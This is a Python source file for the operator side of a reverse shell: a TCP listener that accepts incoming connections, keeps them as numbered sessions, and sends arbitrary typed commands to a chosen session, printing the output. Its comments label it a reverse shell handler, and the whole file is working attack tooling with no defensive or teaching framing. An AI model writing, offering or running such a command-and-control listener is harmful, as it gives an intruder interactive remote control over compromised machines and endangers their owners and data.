import time
import socket
from threading import Thread
from settings import HOST, TCP_PORT, color
#Kill all threads on CTRL+C
import signal
signal.signal(signal.SIGINT, signal.SIG_DFL)


class TCP_Handler():
    def __init__(self) -> None:
        self.sessions = [] #Users sessions


    #--- Display active sessions ---
    def print_sessions(self):
        print(f"{color.RED}\nID\tIp Addr\t\tPort\n-----------------------------{color.END}")
        for s in self.sessions:
            print(f"{s["id"]}\t{s["addr"][0]}\t{s["addr"][1]}")
        print()


    #--- Add incoming session ---
    def add_session(self, conn, addr):
        self.sessions.append({
            "id": str(len(self.sessions)), #ID
            "addr": addr, #Tuple (ip, port)
            "conn": conn #Socket obj
        })


    #--- Delete session on disconnect ---
    def remove_session(self, sess):
        sess["conn"].close()
        if next((self.sessions.pop(i) for i,s in enumerate(self.sessions) if s["id"] == sess["id"]), None):
            print(f"[{color.RED}-{color.END}] Connection - {sess["id"]} closed!")
            return
        print(f"[{color.RED}x{color.END}] There was an error...")
    

    #--- Handle reverse shell --- 
    def new_connection(self, s):

        while True:
            data = input(f"{color.CYAN}[RPw] > {color.END}")

            if data == "exit": #Exit
                return
            elif data == "close": #Close session
                self.remove_session(s)
                return
            
            if len(data) > 0:
                try:
                    s["conn"].sendall(data.encode()) #Send command
                    out = s["conn"].recv(65535) #Receive
                    if out:
                        print(out.decode())
                except ConnectionResetError as e: #User has closed session
                    self.remove_session(s)
                    return
        
    #--- Listen for incoming connections and add to sessions ---
    def start_listening(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, TCP_PORT))
            s.listen()
            while True:
                conn, addr = s.accept()
                print(f"\n[{color.GREEN}+{color.END}] New connection from {color.ORANGE}{addr}{color.END}")
                if next((s for s in self.sessions if s["addr"] == addr), None) is None:
                    self.add_session(conn, addr)
    
    #--- Select sessions menu ---
    def menu(self):
        while True:
            cmd = input(f"[{color.DARKCYAN}{len(self.sessions)}{color.END}] > ")

            cmds = cmd.split(" ")
            if cmds[0] == "session":
                if len(cmds) > 1: #Choose connection

                    s = next((s for s in self.sessions if s["id"] == cmds[1]), None)
                    if s is not None:
                        self.new_connection(s) #Connect to client
                    else:
                        print(f"[{color.RED}x{color.END}] Session not found")
                
                else:
                    self.print_sessions() #Print session

    
    def run(self):
        print(f"[{color.GREEN}+{color.END}] TCP running on {color.YELLOW}{HOST}:{TCP_PORT}{color.END}")
        t1 = Thread(target=self.start_listening, daemon=True) #Connections thread
        time.sleep(1.5)
        t2 = Thread(target=self.menu, daemon=True) #Menu thread
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        return
